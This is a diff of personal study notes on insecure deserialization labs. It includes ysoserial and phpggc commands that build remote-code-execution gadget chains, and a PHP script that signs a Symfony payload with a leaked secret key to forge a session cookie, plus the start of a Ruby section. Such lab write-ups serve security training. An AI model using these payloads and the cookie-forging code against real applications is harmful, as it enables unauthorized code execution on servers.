@@ -42,6 +42,9 @@ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | b
 
 ![[Pasted image 20260727142904.png]]
 
+6. PHP deserialization:
+
+------------------------------------------------------------------------- 
 
 Checklist:
 ```
@@ -98,7 +101,6 @@ cat payload | tr -d '\n'
 ```
 Send the payload url encoded in repeater
 
-
 ##### Exploiting PHP deserialization with a pre-built gadget chain
 Notice that when we try to change the cookie value we get a php error:
 PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7
@@ -110,9 +112,23 @@ with the secret key of the serialization
 
 and we get the tech: Symfony 4.3.6 framework
 Use phpgcc to exploit this https://github.com/ambionics/phpggc
-`./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'`
+
+```bash
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0; echo
+```
+
 Construct the php object with the payload and the secret key:
-`<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;`
+```php
+<?php
+	$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
+
+	$secretKey = "0l215eta8pszvdtl0jauaff6l4yo6rxv";
+
+ 	$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object , $secretKey) . '"}');
+
+ 	echo $cookie;
+?>
+```
 
 php php-object-payload.php to get the cookie that is going to be used
 send the cookie to solve the lab
@@ -120,7 +136,7 @@ send the cookie to solve the lab
 ##### Exploiting Ruby deserialization using a documented gadget chain
 
 Notice that when decodig username variable is like @username, an indicator of ruby language
-Here the script to save:
+Here the script to save 'marshalled.rb':
 ```rb
 require 'base64'
 # Autoload the required classes
